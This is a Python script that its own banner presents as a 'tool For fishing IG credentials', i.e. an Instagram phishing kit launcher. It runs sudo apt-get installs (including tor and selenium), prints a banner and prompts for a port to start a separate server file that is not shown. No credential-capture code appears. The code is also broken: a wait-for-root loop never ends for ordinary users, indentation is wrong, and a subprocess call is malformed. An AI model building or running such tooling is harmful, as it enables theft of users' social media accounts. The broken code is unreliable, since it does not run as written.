#!/usr/bin/env python3

import os
import sys
import time
import re
import subprocess

def check_root():
    return os.geteuid() == 0

def main():
    print("\033[92mCHECKING IF YOU'RE ROOTED...")
    loading_symbols = ["/", "-", "\\", "|"]
    i = 0
    while True:
        print(f"\rLoading{loading_symbols[i % len(loading_symbols)]}", end="")
        i += 1
        time.sleep(10)
        if check_root():
            break

    if check_root():
        print("\033[92mYOU ARE ROOTED.")
    else:
        print("\033[92mYOU ARE NOT ROOTED.")

if __name__ == "__main__":
    main()

# Update packages and install dependencies
subprocess.run(["sudo", "apt-get", "update"])
subprocess.run(["sudo", "apt-get", "install", "-y", "php", "git", "curl", "python3", "ruby", "tor", "bash", "python3-pip", "xidel", "python3-selenium"])

# Install npm
subprocess.run(["sudo", "apt-get", "install", "-y", "npm"])

# Display info
print("\033[92m\n\n")
print("\033[92m ______                          _____        ______              _____        ______       _____                   ")
print("\033[92m |     |     |       |     |     |            |     |     /\     |      \     |            |                        ")
print("\033[92m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   ")
print("\033[92m |     \     |       |     |     |            |     \   /____\   |       |    |      \     |                        ")
print("\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   ")

print("\033[92m\n\n")
print("\033[92m         ***********************************************")
print("\033[92m         #                                             #")
print("\033[92m         #   tool For fishing IG credentials #")
print("\033[92m         #   Follow Me On Github: @ephraim sib#")
print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com#")
print("\033[92m         #   Changelog: 5-12-2023           #")
print("\033[92m         #                                             #")
print("\033[92m         ***********************************************")
print("\033[92m\n\n")

# Prompt user to enter a port number
def validate_port(port):
    return re.match(r'^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port)

def run_server():
    while True:
        port = input("Please enter a port number (1024 to 65535): ")
        if validate_port(port):
            break
        else:
            print("Invalid port number. Please enter a valid port number.")
            
         #To run the server 
       subprocess.run(["python3 my_server.py"])
    
    # Generate the link
    link = f"http://localhost:{port}/"

    # Print the link
    print(f"Generated link: {link}")

    # Set the file to write log messages to
    logfile = "server.log"

    # Set the file to run the server (not applicable in Python)

    # Print start message
    print(f"Starting server on port {port}")

if __name__ == "__main__":
    run_server()
